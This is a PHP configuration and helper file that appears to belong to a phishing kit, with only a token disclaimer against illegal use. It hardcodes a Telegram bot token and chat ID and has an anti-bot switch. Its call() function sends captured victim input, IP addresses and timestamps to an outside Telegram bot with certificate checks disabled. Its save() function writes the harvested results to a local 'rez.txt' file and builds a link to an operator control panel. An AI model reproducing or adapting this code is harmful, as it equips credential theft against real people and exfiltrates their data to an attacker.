<?php

     
// This example page was made by @j33h4n
// Telegram me: https://t.me/j33h4n
// Don't use this example in any illegal use!


$token = "8199537501:AAFrMxfVTg_CPVBeMtmDLT8KrLuCMXJVFKc";
$id = "7740029321";


// use antibot? yes|no
$antibot = "yes";

 
$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
$panel_link = str_replace("fr/send.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");

 

function call($msg){
    global $token;
    global $id;
    global $panel_link;
    $info = "

/- MORE INFO -/
PANEL: $panel_link
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");

    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}


function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}




?>